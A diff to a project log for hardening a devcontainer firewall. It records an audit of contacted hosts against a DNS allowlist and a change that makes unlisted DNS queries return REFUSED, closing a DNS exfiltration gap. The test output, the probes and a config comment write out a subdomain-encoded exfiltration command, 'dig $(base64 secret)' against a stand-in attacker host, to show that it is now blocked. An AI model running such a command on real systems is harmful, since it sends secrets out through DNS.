@@ -116,3 +116,319 @@ projet** — `/scan-deps` y produira potentiellement une vraie liste
 hosts spécifiques).
 
 **Commit** : not committed yet (proposé verbalement à la fin de la session, attend confirmation user).
+
+---
+
+## 2 — cdn-cname-enumeration
+
+**Date** : 2026-05-22
+**Files touched** :
+- `plans/devcontainer-security-hardening-v2/STATUS.md` (row session 2 flip + counter bump + next focus)
+- `plans/devcontainer-security-hardening-v2/LOG.md` (this entry)
+- `plans/devcontainer-security-hardening-v2/sessions/session-3-dnsmasq-strict.md` (NEW — spec for next session)
+
+**What** : Énumération empirique des hosts contactés par Claude Code +
+VS Code + extensions pendant ~16h d'observation, croisée avec
+`templates/v2/firewall/domains.txt` (24 littéraux + 6 wildcards parents).
+Sur 66 hosts uniques observés, **3 hosts en delta DNS** (non couverts
+par allowlist) : `bridge.claudeusercontent.com`, `code.claude.com`,
+`169.254.169.254`. Catégorisation : 2 CDN/docs Anthropic légitimes à
+pré-allowlister en session 3, 1 IP littérale **flag user** (hors scope
+DNS de toute façon).
+
+**Why** : Le ROLLOUT (decision 2026-05-22, conséquence du fix gap #9)
+exige que la session 3 drop le `server=127.0.0.11` catch-all dans
+`dnsmasq.conf`, qui causera REFUSED pour tout host non-listé. Sans cet
+audit empirique préalable, le premier rebuild en mode strict casserait
+les hits légitimes vers ces CDN Anthropic non-manifestés (bridge.*,
+code.*) — UX cassée, perte de confiance dans v2. Anticipation > debug
+réactif (même approche méthodologique que session 1, mais côté réseau
+observé plutôt que manifests applicatifs).
+
+**Decisions** :
+- _Source primaire = `/var/log/mitmproxy.log` (plaintext, 16089 lignes,
+  toutes méthodes)_ — pas `mitmproxy-passive.log` (n'existe pas, le spec
+  session-2 était erroné). Cross-check via writes.log (JSON, POST/PUT
+  only) confirme aucun delta caché côté méthodes mutantes.
+- _Comportement wildcard dnsmasq vérifié dans `compile-policy.py:202,231,355,356`_ :
+  parser strippe `*.` (lignes 202+231), puis `emit_dnsmasq` génère
+  `server=/{host}/8.8.8.8` (ligne 356). Sémantique dnsmasq native :
+  `server=/sentry.io/...` matche **bare + tous sous-domaines**. Donc
+  `*.sentry.io` dans domains.txt couvre `sentry.io` bare au DNS. Les
+  blocs observés sur `sentry.io` / `statsig.com` bare (`method:GET`,
+  7+7 hits) sont **applicatifs** (policy_enforce.py), pas DNS — hors
+  scope session 2.
+- _Pré-allowlist v2 session 2 = 2 hosts à ajouter en session 3_ :
+  `bridge.claudeusercontent.com` (210 hits, Chrome bridge CDN
+  Anthropic, sous-domaine de `claudeusercontent.com` = domaine
+  d'artefacts Anthropic) et `code.claude.com` (1 hit, docs Claude
+  Code UA explicite). Pas de promotion vers wildcard parent
+  (`*.claudeusercontent.com`, `*.claude.com`) — cohérent avec ROLLOUT
+  decision « no wildcard parent promotion » : un npm package
+  compromis pourrait sinon exploiter `c2.claudeusercontent.com`.
+- _`169.254.169.254` → flag user, PAS d'allowlist_ : IP littérale,
+  link-local Azure IMDS endpoint (path `/metadata/instance/compute`
+  est Azure-spécifique, pas AWS qui utilise `/latest/meta-data/`).
+  Hors scope DNS : une IP littérale ne passe pas par dnsmasq → le
+  serrage de session 3 n'affecte rien. Le bloc actuel à 403 par
+  mitmproxy reste la bonne enforcement. Probable sonde Code OSS
+  Server / VS Code Server d'auto-detect d'environnement Azure. UA
+  vide, à investiguer hors v2.
+- _Pré-allowlist v2 cumulée (sessions 1+2) = 2 hosts_ : session 1 a
+  contribué 0 (pas de manifest), session 2 contribue 2 (les CDN
+  Anthropic ci-dessus). À appliquer à `domains.txt` lors de la
+  session 3.
+
+**Gotchas** :
+- Le spec session-2 listait `/var/log/mitmproxy-passive.log` comme
+  source candidate — **ce fichier n'existe pas**. Les 3 logs réels
+  sont : `mitmproxy.log` (plaintext, primaire), `mitmproxy-writes.log`
+  (JSON, POST/PUT/PATCH/DELETE), `mitmproxy-blocks.log` (JSON,
+  policy_enforce blocks). Correction silencieuse — le spec restera
+  archivé tel quel, mais le futur lecteur du LOG.md aura la vraie
+  liste.
+- Beaucoup de "blocks" dans `mitmproxy-blocks.log` (~924 entries) sont
+  `endpoint_not_matched:/` avec UA `curl/7.88.1` — ce sont les tests
+  d'intégration du firewall qui probent chaque host au path `/` pour
+  vérifier que la policy enforcement bloque bien le root. Ces blocs
+  **ne signalent pas un delta DNS** — les hosts sont allowlistés au
+  niveau DNS, juste pas à `/` au niveau path. Filtre appliqué
+  manuellement (regarder uniquement les reason `host_not_in_policy:*`).
+- IP littérale 169.254.169.254 = piège classique : elle apparaît dans
+  l'extraction `grep -oE 'https?://[^/[:space:]]+'` parce qu'elle
+  apparaît dans la requête HTTP littérale — mais comme aucune
+  résolution DNS n'est faite, le serrage dnsmasq est sans effet sur
+  elle. La défense reste iptables/ipset + mitmproxy 403.
+- Les sous-domaines genre `app.githubusercontent.com`,
+  `dev.gallerycdn.vsassets.io`, `mail.githubusercontent.com` (etc.)
+  observés dans le log paraissent suspects au premier coup d'œil
+  mais sont en réalité de vrais hits (résolution GitHub Pages IPs).
+  Probables tests d'allowlist wildcard du test-firewall.sh — couverts
+  par `*.githubusercontent.com` et `*.gallerycdn.vsassets.io` donc
+  pas dans le delta.
+
+**Tests** :
+```bash
+# 1. Hosts uniques contactés
+grep -oE 'https?://[^/[:space:]]+' /var/log/mitmproxy.log \
+  | sed -E 's|https?://||' | sort -u > /tmp/hosts-from-main.txt
+wc -l /tmp/hosts-from-main.txt
+# → 66
+
+# 2. Cross-check via writes.log (POST/PUT/PATCH/DELETE)
+jq -r '.host' /var/log/mitmproxy-writes.log | sort -u
+# → api.anthropic.com, mcp-proxy.anthropic.com (subset de main, no delta)
+
+# 3. Parse allowlist baseline (host-level, drop indented paths)
+grep -vE '^\s*(#|$)' templates/v2/firewall/domains.txt \
+  | grep -vE '^[[:space:]]+' \
+  | sed -E 's/^\[[^]]+\][[:space:]]+//' \
+  | awk '{print $1}' | sed -E 's|/.*||' \
+  > /tmp/allowlist-all.txt
+grep '^\*\.' /tmp/allowlist-all.txt | sed 's/^\*\.//' | sort -u > /tmp/wc.txt
+grep -v '^\*\.' /tmp/allowlist-all.txt | sort -u > /tmp/lit.txt
+wc -l /tmp/lit.txt /tmp/wc.txt
+# → 24 literal, 6 wildcards
+
+# 4. Compute delta
+while IFS= read -r h; do
+  grep -qxF "$h" /tmp/lit.txt && continue
+  m=0; while IFS= read -r p; do
+    [ "$h" = "$p" ] || [[ "$h" == *.$p ]] && m=1 && break
+  done < /tmp/wc.txt
+  [ $m -eq 0 ] && echo "$h"
+done < /tmp/hosts-from-main.txt
+# → 169.254.169.254
+# → bridge.claudeusercontent.com
+# → code.claude.com
+
+# 5. Contexte caller pour catégorisation
+jq -r 'select(.host=="bridge.claudeusercontent.com") |
+       "\(.method) \(.path)"' /var/log/mitmproxy-blocks.log | sort -u
+# → GET /chrome/<uuid>
+```
+
+### Delta hosts + catégorisation
+
+| Host | Hits | Catégorie | Treatment session 3 |
+|---|---|---|---|
+| `bridge.claudeusercontent.com` | 210 | **CDN Anthropic légitime** (Chrome bridge, claudeusercontent = artifact domain) | `[GET] bridge.claudeusercontent.com` + path `/chrome/*` (scoped) |
+| `code.claude.com` | 1 | **Docs Anthropic légitime** (UA `Claude-User (claude-code/2.1.145)`) | `[GET] code.claude.com` + path `/docs/*` (scoped) |
+| `169.254.169.254` | 15 | **SUSPECT / hors scope DNS** (IP littérale, Azure IMDS endpoint) | **NE PAS allowlister**. IP-direct ne passe pas par dnsmasq → strict mode neutre. Flag user pour investigation hors v2 (quel process probe Azure IMDS dans un devcontainer local ?) |
+
+**Commit** : not committed yet (proposé verbalement à la fin de la session, attend confirmation user).
+
+---
+
+## 3 — dnsmasq-strict
+
+**Date** : 2026-05-22
+**Files touched** :
+- `templates/v2/firewall/dnsmasq.conf` (drop catch-all + comment rewrite)
+- `templates/v2/init-firewall.sh` (unconditional claude-bridge override + generic loop over direct-tcp-allow.txt)
+- `templates/v2/firewall/domains.txt` (+2 hosts pre-allowlist from session 2)
+- `templates/v2/tests/integration/test-dns-strict.sh` (NEW — 7 tests)
+- `.devcontainer/firewall/dnsmasq.conf` (mirror — md5 parity)
+- `.devcontainer/init-firewall.sh` (mirror — md5 parity)
+- `.devcontainer/firewall/domains.txt` (mirror — md5 parity)
+- `.devcontainer/knowledge/firewall.md` (NEW subsection "Strict DNS — no catch-all upstream")
+- `.devcontainer/SECURITY-AUDIT-2026-05.md` (vector #9 split into catch-all CLOSED vs wildcards still-accepted ; residual surfaces clarified)
+- `plans/devcontainer-security-hardening-v2/STATUS.md` (row session 3 flip + counter + next focus)
+- `plans/devcontainer-security-hardening-v2/EXISTING.md` (DNS architecture today refresh + source-of-truth section)
+- `plans/devcontainer-security-hardening-v2/LOG.md` (this entry)
+- `plans/devcontainer-security-hardening-v2/sessions/session-4-adversarial-validation.md` (NEW — spec for gate session)
+
+**What** : Closed DNS exfil gap #9. Dropped the `server=127.0.0.11` catch-all
+from `dnsmasq.conf` so non-allowlisted queries return REFUSED (no upstream
+leak). Generalised the previously-hardcoded claude-bridge sibling-resolve
+block in `init-firewall.sh` into (a) an **unconditional claude-bridge
+override** (special-case — see Gotchas) followed by (b) a **generic loop**
+over `direct-tcp-allow.txt` for any other Docker peer. Pre-allowlisted the 2
+Claude Code CDNs surfaced by session 2's empirical audit
+(`bridge.claudeusercontent.com`, `code.claude.com`). Authored
+`test-dns-strict.sh` (7 tests, source `lib.sh` style) to validate runtime
+behavior.
+
+**Why** : Sessions 1+2 had validated that the pre-allowlist required to
+safely close gap #9 is minimal (0 manifest, 2 CDNs from logs). With the
+runway clear, session 3 applies the actual DNS fix — the core of v2.
+Result : critère 3 of the v1 threat model ("node cannot exfil without
+rebuild") now holds under a strict reading, not just the audit-accepted
+reading.
+
+**Decisions** :
+- _Mirror to `.devcontainer/` in addition to `templates/v2/`_ — Original plan
+  scoped only `templates/v2/`. Discovered mid-session that `.devcontainer/`
+  in this repo is the **live mirror** used by this devcontainer (NOT a v1
+  legacy as I had assumed), and the Dockerfile bakes from `.devcontainer/
+  firewall/` via `COPY firewall/ /etc/devcontainer-firewall/`. Without
+  the mirror update, the rebuild had no effect → had to mirror and rebuild
+  again. EXISTING.md now flags both paths as authoritative.
+- _Unconditional claude-bridge override (not just loop-driven)_ —
+  `claude-bridge` is always declared in `docker-compose.yml` AND
+  unconditionally listed in baked `domains.txt` (L133 `[POST]
+  claude-bridge`). `compile-policy.py` therefore always emits
+  `server=/claude-bridge/8.8.8.8` (which is wrong — 8.8.8.8 doesn't know
+  about Docker peers, returns NXDOMAIN). The override toward `127.0.0.11`
+  (Docker resolver, which knows about the compose graph) must therefore
+  always be emitted, regardless of `direct-tcp-allow.txt` mode. The loop
+  skips `claude-bridge` to prevent double-emission.
+- _Generic loop emits `cname=<host>.local,<host>` for every non-host entry_
+  (cf. plan decision 2026-05-22). Mirrors the `ollama.local` /
+  `claude-bridge.local` pattern used to bypass mitm via NO_PROXY=.local
+  matching, scales to future direct-tcp-allow.txt entries.
+- _No backport to v1 rollout_ — v2 is the closure of gap #9 ; v1 remains in
+  its audit-accepted state. `templates/v2/` is the forward path ; existing
+  v1 deployments adopt v2 when they migrate (v2-migration rollout).
+
+**Gotchas** :
+- _Initial design missed the claude-bridge unconditional override_ — first
+  implementation made the override conditional on `direct-tcp-allow.txt`
+  membership. In cloud mode (`claude-bridge:9223` commented out), the
+  override wasn't emitted → compile-policy's wrong `server=/claude-bridge/
+  8.8.8.8` line stayed → `dig claude-bridge @127.0.0.53` → NXDOMAIN →
+  `test-firewall.sh` flagged it. Diagnostic via `dig claude-bridge
+  @127.0.0.11` (Docker resolver direct) → SUCCESS, confirming the
+  regression was in my fix, not the sidecar state. Fixed by promoting
+  claude-bridge to an unconditional override block above the loop. Lesson :
+  hosts that appear in baked `domains.txt` regardless of mode need their
+  DNS override decoupled from mode-driven sources like
+  `direct-tcp-allow.txt`.
+- _Three full devcontainer rebuilds needed_ — (1) initial template-only
+  changes, no effect (mirror not updated) ; (2) mirror added, regression on
+  claude-bridge ; (3) regression fixed. Hereafter, when editing
+  `templates/v2/firewall/*` for THIS repo's live behavior, also touch
+  `.devcontainer/firewall/*` and `.devcontainer/init-firewall.sh`. md5sum
+  cross-check is the cheap way to verify parity.
+- _ipset "no ipset match" intermittent_ — `test-firewall.sh` may flag
+  `❌ claude-bridge (no ipset match — DNS allowlist broken)` if the ipset
+  entry has expired before the probe. This is a pre-existing timing
+  interaction between dnsmasq's cache TTL and the ipset notifier (which
+  only fires on upstream answers, not cache hits — same root cause that
+  the ollama block's `local-ttl=3600` + manual `ipset add timeout=0`
+  works around). Not a regression of session 3. The expected steady-state
+  message is `ℹ️ claude-bridge — DNS-allowlisted but L4 not opted in` in
+  cloud mode.
+- _`.devcontainer/` isn't a symlink — it's a separate copy_ — the
+  v2-migration rollout keeps them in sync incrementally. Some divergence
+  exists (e.g. extra ipset workaround block in
+  `.devcontainer/init-firewall.sh` past L300). For session 3's scope, only
+  the claude-bridge block region was touched ; the rest of the divergence
+  is handled by the v2-migration rollout.
+
+**Tests** (runtime, post-3rd-rebuild) :
+```
+=== test-dns-strict.sh ===
+  ✓ test_allowlisted_anthropic_resolves     :: dig api.anthropic.com → returns IPv4
+  ✓ test_hostdockerinternal_resolves        :: dig host.docker.internal → returns IPv4 (ollama-block host-record)
+  ✓ test_poc9_evil_subdomain_refused        :: dig $(base64).attacker.example.invalid → REFUSED
+  ✓ test_session2_bridge_resolves           :: dig bridge.claudeusercontent.com → returns IPv4
+  ✓ test_session2_codedocs_resolves         :: dig code.claude.com → returns IPv4
+  ⊘ test_sibling_claudebridge_resolves_when_active — skipped : cloud mode (loop branch exercised statically only)
+  ✓ test_unlisted_random_refused            :: dig random.example.invalid → REFUSED
+
+--- 6 pass / 0 fail / 1 skip ---
+```
+
+In vivo dig probes :
+- `dig claude-bridge @127.0.0.53` → `192.168.16.2` NOERROR (regression fixed)
+- `dig $(base64 secret).attacker.example.invalid @127.0.0.53` → `REFUSED` (PoC #9 closed)
+- `dig api.anthropic.com @127.0.0.53` → `160.79.104.10` NOERROR
+
+Logger check post-rebuild : no new `host_not_in_policy:*` blocks.
+Pre-existing Copilot `blocked_header:x-vscode-user-agent-library-version`
+blocks unchanged. All `endpoint_not_matched:/` entries are `curl/7.88.1`
+i.e. `test-firewall.sh` probing each host at `/` — normal.
+
+### Diff summary
+
+**`dnsmasq.conf`** — single block change :
+
+```diff
+-# Default upstream for non-listed domains: Docker's internal resolver
+-# (lets container names like theshop-db / redis / host.docker.internal resolve).
+-server=127.0.0.11
++# No default upstream — non-allowlisted queries return REFUSED, so a
++# subdomain-encoded payload (`dig $(base64 secret).attacker.com`) cannot
++# leak via Docker DNS → host DNS → public DNS hierarchy (gap #9 of the
++# v1 adversarial validation). Sibling Docker peers (claude-bridge etc.)
++# are resolved by per-host `server=/<name>/127.0.0.11` lines emitted at
++# boot from direct-tcp-allow.txt ; host.docker.internal is resolved by
++# the ollama block's `host-record=` directive — both injected by
++# init-firewall.sh into the generated dnsmasq-domains.conf.
+```
+
+**`init-firewall.sh`** L280-299 — before / after :
+
+```
+BEFORE (v1) :
+  sed -i strip server=/claude-bridge/...
+  cat >> server=/claude-bridge/127.0.0.11 + cname=claude-bridge.local,claude-bridge
+
+AFTER (session 3) :
+  # 1. Unconditional claude-bridge override (verbatim v1 behavior, restored)
+  sed -i strip server=/claude-bridge/...
+  cat >> server=/claude-bridge/127.0.0.11 + cname=claude-bridge.local,claude-bridge
+
+  # 2. Generic sibling-resolve loop (new)
+  if [ -f $DIRECT_TCP_ALLOW ]; then
+    while read raw_line; do
+      line=strip-comment-and-whitespace
+      [ -z "$line" ] && continue
+      host=${line%%:*}
+      [ "$host" = "host" ] && continue
+      [ "$host" = "host.docker.internal" ] && continue
+      [ "$host" = "claude-bridge" ] && continue
+      escaped=${host//./\\.}
+      sed -i strip server=/<escaped>/...
+      cat >> server=/<host>/127.0.0.11 + cname=<host>.local,<host>
+    done < $DIRECT_TCP_ALLOW
+  fi
+```
+
+**`domains.txt`** — +9 lines after `console.anthropic.com` (L149) :
+2 new hosts pre-allowlisted (bridge.claudeusercontent.com,
+code.claude.com), path-scoped to `/chrome/*` and `/docs/*` respectively.
+
+**Commit** : not committed yet (proposed at end of session, awaiting user
+confirmation).
